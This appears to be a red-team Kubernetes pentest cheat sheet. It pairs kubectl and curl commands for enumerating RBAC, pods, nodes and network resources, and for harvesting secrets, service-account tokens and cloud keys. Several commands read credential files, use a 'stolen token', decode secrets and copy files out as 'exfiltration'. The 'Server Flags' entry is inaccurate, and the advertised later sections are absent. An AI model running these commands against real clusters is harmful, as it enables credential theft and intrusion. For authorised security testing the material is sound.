# Kubernetes Pentest Quick Wins, (Red Team) - Complete Reference (v2.0)

---

## 📋 Table of Contents

1. [Setup & Initial Access](#setup--initial-access)
2. [Complete Command Reference](#complete-command-reference)
3. [Advanced Exploitation Techniques](#advanced-exploitation-techniques)
4. [API Resource Deep Dive](#api-resource-deep-dive)
5. [Automated Enumeration Scripts](#automated-enumeration-scripts)
6. [Detection & OPSEC](#detection--opsec)

---

## Setup & Initial Access

### Environment Variables (Copy-Paste Ready)

```bash
# Standard in-cluster service account setup
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
export APISERVER="https://kubernetes.default.svc.cluster.local"

# Alternative: CA certificate for TLS validation
export CACERT="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

# Helper function for curl requests
k8s_curl() {
  curl -sk --cacert "$CACERT" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Accept: application/json" \
    "$@"
}

# Test connectivity
k8s_curl "$APISERVER/version" | jq .
```

### External Access Setup

```bash
# If you have a stolen token or kubeconfig
export TOKEN="eyJhbGciOiJSUzI1NiIsImtpZCI6Ii..."
export APISERVER="https://k8s-api.target.com:6443"

# Test with kubectl
kubectl --token="$TOKEN" --server="$APISERVER" --insecure-skip-tls-verify get ns

# Test with curl
curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces"
```

---

## Complete Command Reference

### 🔍 Initial Reconnaissance

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **Cluster Version** | CVE identification, exploit selection | `kubectl version --short` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/version"` | Compare with https://kubernetes.io/docs/reference/issues-security/official-cve-feed/ |
| **API Server Info** | Discover enabled features, admission controllers | `kubectl cluster-info` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api"` | Look for deprecated APIs |
| **Current Context** | Understand your identity | `kubectl config current-context` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/default"` | Shows namespace and SA name |
| **API Resources** | Map attack surface | `kubectl api-resources` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1" \| jq -r '.resources[].name'` | Save full list for reference |
| **API Versions** | Find deprecated/beta APIs | `kubectl api-versions` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis" \| jq -r '.groups[].preferredVersion.groupVersion'` | Beta APIs often have weaker security |
| **Server Flags** | Check for insecure flags | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq -r '.items[].spec.providerID'` | Look for --anonymous-auth, --insecure-port |
| **Healthz Check** | API server status | `kubectl get --raw /healthz` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/healthz"` | Check /livez and /readyz too |
| **OpenAPI Schema** | Discover all endpoints | `kubectl get --raw /openapi/v2` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/openapi/v2" > schema.json` | Contains all API paths |

### 🏢 Namespace Enumeration

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List All Namespaces** | Map environment scope | `kubectl get namespaces` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces"` | Focus on kube-system, default, prod |
| **Namespace Details** | Find labels, annotations | `kubectl describe ns kube-system` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/kube-system"` | Look for owner annotations |
| **Namespace Names Only** | Quick enumeration | `kubectl get ns -o name` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" \| jq -r '.items[].metadata.name'` | Pipe to loops |
| **Namespace with Labels** | Identify environment types | `kubectl get ns --show-labels` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces" \| jq -r '.items[] \| "\(.metadata.name): \(.metadata.labels)"'` | Look for env=prod |
| **Resource Quotas** | Check limits | `kubectl get resourcequota -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/resourcequotas"` | Find namespaces without quotas |
| **Limit Ranges** | Check constraints | `kubectl get limitranges -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/limitranges"` | Understand resource boundaries |

### 🔐 RBAC Deep Dive

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **Full Permissions List** | **CRITICAL**: Your privilege map | `kubectl auth can-i --list` | `curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"*","resource":"*"}}}'` | Run this first |
| **Check Specific Permission** | Test individual actions | `kubectl auth can-i create pods` | `curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods"}}}'` | Test dangerous verbs |
| **Check Exec Permission** | Remote code execution check | `kubectl auth can-i create pods/exec` | `curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"create","resource":"pods","subresource":"exec"}}}'` | High-value target |
| **Check Secret Access** | Credential access | `kubectl auth can-i get secrets -n kube-system` | `curl -sk -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -X POST "$APISERVER/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectAccessReview","spec":{"resourceAttributes":{"verb":"get","resource":"secrets","namespace":"kube-system"}}}'` | Test all namespaces |
| **List Service Accounts** | Find privilege escalation paths | `kubectl get serviceaccounts -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/serviceaccounts"` | Focus on system: accounts |
| **SA Token Secrets** | Extract SA tokens | `kubectl get sa default -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/serviceaccounts/default"` | Modern K8s uses projected tokens |
| **List All Roles** | Map namespace permissions | `kubectl get roles -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/roles"` | Look for wildcard verbs |
| **Role Details** | Examine specific role | `kubectl get role myrole -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/roles/myrole"` | Check rules array |
| **List ClusterRoles** | **HIGH VALUE**: Cluster-wide permissions | `kubectl get clusterroles` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles"` | Focus on admin roles |
| **ClusterRole Rules** | Examine dangerous permissions | `kubectl get clusterrole cluster-admin -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles/cluster-admin"` | Look for `["*"]` verbs |
| **Find Admin Roles** | Identify highest privileges | `kubectl get clusterroles -o name \| grep admin` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" \| jq -r '.items[] \| select(.metadata.name \| test("admin")) \| .metadata.name'` | Common names: admin, edit, cluster-admin |
| **List RoleBindings** | Who has what permissions | `kubectl get rolebindings -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/rolebindings"` | Map subjects to roles |
| **RoleBinding Details** | Examine specific binding | `kubectl get rolebinding mybinding -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/namespaces/$NAMESPACE/rolebindings/mybinding"` | Check subjects and roleRef |
| **List ClusterRoleBindings** | **GOLD MINE**: Cluster-wide grants | `kubectl get clusterrolebindings` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings"` | System accounts often over-privileged |
| **Find Cluster-Admin Users** | Ultimate privilege holders | `kubectl get clusterrolebindings -o json \| jq '.items[] \| select(.roleRef.name=="cluster-admin")'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \| jq '.items[] \| select(.roleRef.name=="cluster-admin")'` | Compromise these accounts |
| **Find Anonymous Bindings** | Unauthenticated access | `kubectl get clusterrolebindings -o json \| jq '.items[] \| select(.subjects[]?.name=="system:anonymous")'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterrolebindings" \| jq '.items[] \| select(.subjects[]?.name=="system:anonymous")'` | Usually discovery role only |
| **Find Wildcarded Roles** | Overly permissive roles | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/rbac.authorization.k8s.io/v1/clusterroles" \| jq '.items[] \| select(.rules[]? \| (.verbs[]? == "*") or (.resources[]? == "*")) \| .metadata.name'` | Dangerous configurations |

### 🔑 Secret & Credential Hunting

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List All Secrets** | **GOLD MINE**: Credentials everywhere | `kubectl get secrets -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets"` | Try all namespaces |
| **Secret Details** | Extract secret values | `kubectl get secret mysecret -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/mysecret"` | Values are base64-encoded |
| **Decode Secret** | Get plaintext values | `kubectl get secret mysecret -o jsonpath='{.data.password}' \| base64 -d` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets/mysecret" \| jq -r '.data.password' \| base64 -d` | Pipe to base64 -d |
| **Secret Names Only** | Quick enumeration | `kubectl get secrets -o name` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/secrets" \| jq -r '.items[].metadata.name'` | Look for obvious names |
| **Find SA Token Secrets** | Service account tokens | `kubectl get secrets -A --field-selector type=kubernetes.io/service-account-token` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq '.items[] \| select(.type=="kubernetes.io/service-account-token")'` | Legacy token format |
| **Find TLS Secrets** | Certificates and keys | `kubectl get secrets -A --field-selector type=kubernetes.io/tls` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq '.items[] \| select(.type=="kubernetes.io/tls")'` | Extract certs |
| **Find Docker Registry Secrets** | Container registry credentials | `kubectl get secrets -A --field-selector type=kubernetes.io/dockerconfigjson` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq '.items[] \| select(.type=="kubernetes.io/dockerconfigjson")'` | Often have broad registry access |
| **Find Basic Auth Secrets** | HTTP basic auth credentials | `kubectl get secrets -A --field-selector type=kubernetes.io/basic-auth` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq '.items[] \| select(.type=="kubernetes.io/basic-auth")'` | Username + password |
| **Find SSH Auth Secrets** | SSH private keys | `kubectl get secrets -A --field-selector type=kubernetes.io/ssh-auth` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq '.items[] \| select(.type=="kubernetes.io/ssh-auth")'` | Lateral movement |
| **Search Secret Names** | Find sensitive-looking secrets | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq -r '.items[] \| select(.metadata.name \| test("password\|token\|key\|secret\|credential\|admin\|root";"i")) \| .metadata.name'` | Regex search |
| **List ConfigMaps** | Configuration with secrets | `kubectl get configmaps -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/configmaps"` | Often contain credentials |
| **ConfigMap Details** | Extract configuration | `kubectl get cm myconfig -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/configmaps/myconfig"` | Check data field |
| **Search ConfigMap Data** | Find credentials in configs | `kubectl get cm -A -o json \| jq '.items[] \| select(.data \| to_entries[] \| .value \| test("password\|token\|key\|secret"; "i"))'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/configmaps" \| jq '.items[] \| select(.data \| to_entries[]? \| .value \| test("password\|token\|key\|secret";"i"))'` | Insecure storage |
| **Find AWS Credentials** | Cloud provider keys | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq -r '.items[] \| select(.data \| keys[] \| test("AWS_ACCESS_KEY\|aws_access_key_id";"i")) \| .metadata.name'` | High value |
| **Find GCP Credentials** | Google Cloud keys | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/secrets" \| jq -r '.items[] \| select(.data \| keys[] \| test("service.account.json\|gcp";"i")) \| .metadata.name'` | Service account JSON |

### 🔓 Pod Reconnaissance & Exploitation

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List All Pods** | Map running workloads | `kubectl get pods -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods"` | Note running status |
| **Pod Full YAML** | Complete pod specification | `kubectl get pod mypod -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/mypod"` | Check security context |
| **Pod Details** | Human-readable details | `kubectl describe pod mypod` | Use kubectl for this | Easier to read than JSON |
| **Find Privileged Pods** | **HIGH VALUE**: Container escape paths | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.containers[].securityContext.privileged==true) \| .metadata.name'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.containers[].securityContext.privileged==true) \| "\(.metadata.namespace)/\(.metadata.name)"'` | Full host access |
| **Find Host Network Pods** | Network namespace escape | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.hostNetwork==true) \| .metadata.name'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.hostNetwork==true) \| "\(.metadata.namespace)/\(.metadata.name)"'` | See host network |
| **Find Host PID Pods** | Process namespace escape | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.hostPID==true) \| .metadata.name'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.hostPID==true) \| "\(.metadata.namespace)/\(.metadata.name)"'` | ps sees host processes |
| **Find Host IPC Pods** | IPC namespace escape | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.hostIPC==true) \| .metadata.name'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.hostIPC==true) \| "\(.metadata.namespace)/\(.metadata.name)"'` | Shared memory access |
| **Find Host Path Mounts** | File system access | `kubectl get pods -A -o json \| jq '.items[] \| select(.spec.volumes[]?.hostPath) \| .metadata.name'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.volumes[]?.hostPath) \| "\(.metadata.namespace)/\(.metadata.name): \(.spec.volumes[].hostPath.path)"'` | Read host files |
| **Find Pods with Capabilities** | Dangerous Linux capabilities | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.containers[].securityContext.capabilities.add[]? \| test("SYS_ADMIN\|NET_ADMIN\|SYS_PTRACE\|SYS_MODULE")) \| "\(.metadata.namespace)/\(.metadata.name)"'` | Container escape vectors |
| **Find Pods as Root** | UID 0 pods | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods" \| jq '.items[] \| select(.spec.containers[].securityContext.runAsUser == 0 or .spec.securityContext.runAsUser == 0) \| "\(.metadata.namespace)/\(.metadata.name)"'` | Root in container |
| **Get Pod Logs** | Application output | `kubectl logs mypod` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/mypod/log"` | May contain secrets |
| **Get Previous Logs** | Crashed container logs | `kubectl logs mypod --previous` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/mypod/log?previous=true"` | Debug information |
| **Follow Logs** | Real-time log streaming | `kubectl logs mypod -f` | N/A | Use kubectl for streaming |
| **Exec into Pod** | **CRITICAL**: Remote code execution | `kubectl exec -it mypod -- /bin/bash` | `curl -sk -H "Authorization: Bearer $TOKEN" -X POST "$APISERVER/api/v1/namespaces/$NAMESPACE/pods/mypod/exec?command=/bin/bash&stdin=true&stdout=true&tty=true" -H "Connection: Upgrade" -H "Upgrade: SPDY/3.1"` | Requires SPDY upgrade |
| **Exec Single Command** | One-shot execution | `kubectl exec mypod -- whoami` | Complex via curl | Use kubectl for simplicity |
| **Port Forward** | Access pod services | `kubectl port-forward mypod 8080:80` | N/A | Requires persistent connection |
| **Copy Files From Pod** | Exfiltrate data | `kubectl cp mypod:/etc/passwd ./passwd` | N/A | Uses tar over exec |
| **Copy Files To Pod** | Upload tools | `kubectl cp ./tool mypod:/tmp/tool` | N/A | Requires write access |
| **Find Pods by Label** | Target specific apps | `kubectl get pods -l app=nginx` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods?labelSelector=app=nginx"` | Label selectors |
| **Find Pods by Field** | Status-based queries | `kubectl get pods --field-selector status.phase=Running` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/pods?fieldSelector=status.phase=Running"` | Field selectors |

### 🖥️ Node Reconnaissance

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List Nodes** | Map infrastructure | `kubectl get nodes` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes"` | Note roles and versions |
| **Node Details** | Full node specification | `kubectl get node mynode -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes/mynode"` | OS, kubelet version |
| **Node Status** | Health and capacity | `kubectl describe node mynode` | Use kubectl | Easier to read |
| **Node Labels** | Identify special nodes | `kubectl get nodes --show-labels` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq -r '.items[] \| "\(.metadata.name): \(.metadata.labels)"'` | GPU, storage, etc. |
| **Node Taints** | Scheduling restrictions | `kubectl get nodes -o json \| jq '.items[].spec.taints'` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq -r '.items[] \| select(.spec.taints) \| "\(.metadata.name): \(.spec.taints)"'` | NoExecute, NoSchedule |
| **Node Conditions** | Disk, memory pressure | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq '.items[] \| "\(.metadata.name): \(.status.conditions[] \| select(.status=="True") \| .type)"'` | Resource constraints |
| **Kubelet Version** | Identify outdated kubelets | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq -r '.items[] \| "\(.metadata.name): \(.status.nodeInfo.kubeletVersion)"'` | CVE hunting |
| **OS Info** | Operating system details | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq -r '.items[] \| "\(.metadata.name): \(.status.nodeInfo.osImage)"'` | Kernel versions |
| **Container Runtime** | Docker, containerd, cri-o | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/nodes" \| jq -r '.items[] \| "\(.metadata.name): \(.status.nodeInfo.containerRuntimeVersion)"'` | Runtime-specific exploits |
| **Node Pods** | What's running on each node | `kubectl get pods -A --field-selector spec.nodeName=mynode` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/pods?fieldSelector=spec.nodeName=mynode"` | Target specific nodes |

### 🚀 Workload Analysis

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List Deployments** | Application architecture | `kubectl get deployments -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/deployments"` | Replica counts |
| **Deployment Details** | Full deployment spec | `kubectl get deployment mydep -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/namespaces/$NAMESPACE/deployments/mydep"` | Strategy, selectors |
| **Deployment History** | Rollout history | `kubectl rollout history deployment mydep` | N/A | Use kubectl |
| **List DaemonSets** | **HIGH INTEREST**: Node-level services | `kubectl get daemonsets -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/daemonsets"` | Often privileged |
| **DaemonSet Details** | Check for privilege escalation | `kubectl get ds mydaemonset -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/namespaces/$NAMESPACE/daemonsets/mydaemonset"` | HostPath common |
| **List StatefulSets** | Persistent workloads | `kubectl get statefulsets -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/statefulsets"` | Databases, queues |
| **StatefulSet Details** | Volume claims | `kubectl get sts mystatefulset -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/namespaces/$NAMESPACE/statefulsets/mystatefulset"` | Persistent data |
| **List ReplicaSets** | Underlying replica management | `kubectl get replicasets -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/replicasets"` | Created by deployments |
| **List Jobs** | Batch workloads | `kubectl get jobs -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/batch/v1/jobs"` | One-off tasks |
| **Job Details** | Job configuration | `kubectl get job myjob -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/batch/v1/namespaces/$NAMESPACE/jobs/myjob"` | Completions, parallelism |
| **List CronJobs** | **HIGH VALUE**: Scheduled privileged tasks | `kubectl get cronjobs -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/batch/v1/cronjobs"` | Backdoor persistence |
| **CronJob Details** | Schedule and job template | `kubectl get cronjob mycron -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/batch/v1/namespaces/$NAMESPACE/cronjobs/mycron"` | Modify for persistence |
| **Find High Replica Count** | Resource-intensive apps | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apps/v1/deployments" \| jq '.items[] \| select(.spec.replicas > 10) \| "\(.metadata.namespace)/\(.metadata.name): \(.spec.replicas)"'` | DDoS potential |

### 🌐 Network Discovery

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List Services** | Internal service discovery | `kubectl get services -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/services"` | ClusterIP, NodePort, LoadBalancer |
| **Service Details** | Ports and endpoints | `kubectl get svc myservice -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/services/myservice"` | Target ports |
| **Find External Services** | LoadBalancer and NodePort | `kubectl get svc -A --field-selector spec.type=LoadBalancer` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/services" \| jq '.items[] \| select(.spec.type=="LoadBalancer" or .spec.type=="NodePort") \| "\(.metadata.namespace)/\(.metadata.name)"'` | External exposure |
| **List Endpoints** | Actual backend IPs | `kubectl get endpoints -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/endpoints"` | Pod IPs |
| **Endpoint Details** | Backend addresses | `kubectl get ep myendpoint -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/endpoints/myendpoint"` | Direct pod access |
| **List Ingresses** | HTTP(S) routing | `kubectl get ingresses -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/networking.k8s.io/v1/ingresses"` | External hostnames |
| **Ingress Details** | TLS and routing rules | `kubectl get ing myingress -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/networking.k8s.io/v1/namespaces/$NAMESPACE/ingresses/myingress"` | Certificate secrets |
| **Find Ingress TLS Secrets** | Extract TLS certificates | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/networking.k8s.io/v1/ingresses" \| jq -r '.items[] \| .spec.tls[]?.secretName'` | Certificate exfiltration |
| **List NetworkPolicies** | Segmentation rules | `kubectl get networkpolicies -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/networking.k8s.io/v1/networkpolicies"` | Firewall rules |
| **NetworkPolicy Details** | Ingress/egress rules | `kubectl get netpol mypolicy -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/networking.k8s.io/v1/namespaces/$NAMESPACE/networkpolicies/mypolicy"` | Find bypasses |
| **Find Namespaces Without NetworkPolicies** | Flat networks | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/networking.k8s.io/v1/networkpolicies" \| jq -r '[.items[].metadata.namespace] \| unique'` then compare with all namespaces | No isolation |

### 💾 Storage & Persistence

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List PersistentVolumes** | Cluster storage | `kubectl get persistentvolumes` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/persistentvolumes"` | Unencrypted data |
| **PV Details** | Storage configuration | `kubectl get pv mypv -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/persistentvolumes/mypv"` | Access modes, capacity |
| **List PVCs** | Namespace storage claims | `kubectl get persistentvolumeclaims -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/persistentvolumeclaims"` | Who uses what storage |
| **PVC Details** | Claim specifications | `kubectl get pvc mypvc -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/namespaces/$NAMESPACE/persistentvolumeclaims/mypvc"` | Bound volumes |
| **List Storage Classes** | Storage provisioners | `kubectl get storageclasses` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/storage.k8s.io/v1/storageclasses"` | Default class |
| **StorageClass Details** | Provisioner and parameters | `kubectl get sc mystorage -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/storage.k8s.io/v1/storageclasses/mystorage"` | Encryption settings |
| **Find Unbound PVCs** | Storage issues | `kubectl get pvc -A --field-selector status.phase=Pending` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/persistentvolumeclaims" \| jq '.items[] \| select(.status.phase=="Pending") \| "\(.metadata.namespace)/\(.metadata.name)"'` | Provisioning problems |
| **Find RWX Volumes** | Shared storage | N/A | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/persistentvolumes" \| jq '.items[] \| select(.spec.accessModes[] == "ReadWriteMany") \| .metadata.name'` | Multi-pod access |

### 📊 Events & Monitoring

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List Events** | Cluster activity log | `kubectl get events -A` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/events"` | Security events |
| **Recent Events** | Last hour of activity | `kubectl get events --sort-by=.metadata.creationTimestamp` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/events" \| jq '.items \| sort_by(.metadata.creationTimestamp) \| reverse'` | Real-time monitoring |
| **Warning Events** | Issues and errors | `kubectl get events --field-selector type=Warning` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/events?fieldSelector=type=Warning"` | Failures |
| **Events for Object** | Specific resource events | `kubectl get events --field-selector involvedObject.name=mypod` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/api/v1/events?fieldSelector=involvedObject.name=mypod"` | Debug specific pods |

### 🔧 Custom Resources & Extensions

| Purpose | Why It Matters | kubectl Command | curl Equivalent | Notes |
|---------|---------------|-----------------|-----------------|-------|
| **List CRDs** | Custom resource definitions | `kubectl get customresourcedefinitions` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apiextensions.k8s.io/v1/customresourcedefinitions"` | Extended API surface |
| **CRD Details** | Custom resource schema | `kubectl get crd mycrd -o yaml` | `curl -sk -H "Authorization: Bearer $TOKEN" "$APISERVER/apis/apiextensions.k8s.io/v1/customresourcedefinitions/mycrd"` | Validation rules |
